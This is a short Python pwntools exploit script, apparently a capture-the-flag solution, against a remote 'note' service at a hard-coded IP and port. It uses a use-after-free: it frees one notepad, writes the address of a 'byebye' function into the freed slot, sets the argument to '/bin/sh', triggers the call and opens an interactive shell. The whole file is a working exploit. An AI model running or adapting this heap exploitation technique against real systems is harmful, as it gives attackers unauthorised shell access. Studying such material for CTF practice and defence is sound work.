#!/usr/bin/python3
from pwn import *

elf = ELF("./note")
p = remote("35.228.52.143", 5236)
#p = process("./note")

#gdb.attach(p)

# 1. create two notepads,
# 2. delete first
# 3. create note

def notepad(idx, name):
    p.sendlineafter(">", "W")
    p.sendlineafter("?", str(idx))
    p.sendlineafter(":", name)

def note(np_idx, idx, text, description):
    p.sendlineafter(">", "S")
    p.sendlineafter("?", str(np_idx))
    p.sendlineafter("?", str(idx))

    p.sendlineafter(":", text)
    p.sendlineafter(":", description)

def delete_notepad(idx):
    p.sendlineafter(">", "A")
    p.sendlineafter("?", str(idx))

def edit_note(np_idx, idx, text, description):
    p.sendlineafter(">", "E")
    p.sendlineafter("?", str(np_idx))
    p.sendlineafter("?", str(idx))
    p.sendlineafter(":", text)
    p.sendlineafter(":", description)


notepad(0, "AAAA")
notepad(1, "BBBB")

delete_notepad(0)

buf = b''
buf += p64(elf.symbols['byebye'])

note(1, 0, buf, "DDDD")
edit_note(0, 0, "/bin/sh", "A")
p.sendlineafter(">", "!")


p.interactive()
